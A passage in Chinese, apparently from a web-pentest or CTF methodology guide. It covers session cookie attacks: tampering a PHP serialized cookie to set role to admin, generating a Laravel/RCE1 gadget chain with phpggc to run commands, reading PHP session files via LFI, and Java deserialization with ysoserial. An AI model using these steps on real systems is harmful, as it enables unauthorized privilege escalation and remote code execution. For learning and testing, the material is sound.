原始: a:2:{s:4:"user";s:5:"admin";s:4:"role";s:4:"user";}
改后: a:2:{s:4:"user";s:5:"admin";s:4:"role";s:5:"admin";}
      ↑ 改 role 值的同时，s:4:"role" 后面的内容长度 s:5 必须同步！
```

> [!danger] 序列化字符串里的 `s:N:"值"` 长度标记必须与实际内容一致；改值不改长度会导致反序列化失败，甚至打崩环境。改值 = 改长度，同步进行。
预期结果：替换后服务端解析出新角色。如果不行：字段没参与权限判断，继续第 4 步找反序列化入口。
#### 第 4 步：PHP 反序列化 → RCE（有源码/gadget 时）
```bash
# 1. 确认框架与版本（报错信息、源码泄露、依赖指纹）
# 2. 用 phpggc 生成 POP 链
phpggc -l                          # 列出全部 gadget
phpggc Laravel/RCE1 'system' 'id'  # 示例: 生成执行 id 的序列化 payload
# 3. 把输出 base64 编码后放进序列化 Cookie / 参数，触发反序列化

# 辅助: PHP session 文件在 /tmp/sess_<SID>，可配合 LFI 读取确认内容
```
预期结果：目标执行 `id` 并回显命令结果。如果不行：gadget 链必须匹配具体框架与依赖版本，链不匹配不触发，回第 1 步重新确认版本。
#### 第 5 步：Java 会话注意区分（JSESSIONID 一般不直接利用）
```txt
Java 的 JSESSIONID 只是服务端内存会话的索引（像钥匙编号），篡改它没有意义。
真正的攻击面在「接收序列化对象的接口 / 自定义 Cookie 格式」，
配合 ysoserial 生成对应版本链才轮到反序列化（参见 09-auth 的 shiro 条目）。
```
#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 改 uid 无效 | 服务端以服务端会话为准 | 找其它可控参数或回源逻辑 |
| 替换序列化 Cookie 后 500 | 长度:值 不匹配 | 改值必同步 `s:N:` 的 N |
| 反序列化无反应 | 版本/gadget 不匹配 | phpggc 指定版本链，先本地复现 |
| 把非序列化当序列化 | 看走眼 | 用 `grep -oE 'O:[0-9]+:"[^"]+"'` 强校验特征 |
#### 实战要点
- 顺序：识别类型 → 明文/Base64 直接改 → 序列化长度篡改 → 反序列化 RCE
- `s:N:` 长度字段是新手最大坑，改值必改长度
- 反序列化前先确认语言、框架、依赖版本，链不匹配既不触发还可能打崩环境
- phpggc / ysoserial 只是生成器，关键在服务端哪一行在反序列化不可信数据
- PHP session 文件（/tmp/sess_*）+ LFI 组合可读会话内容，辅助定位利用点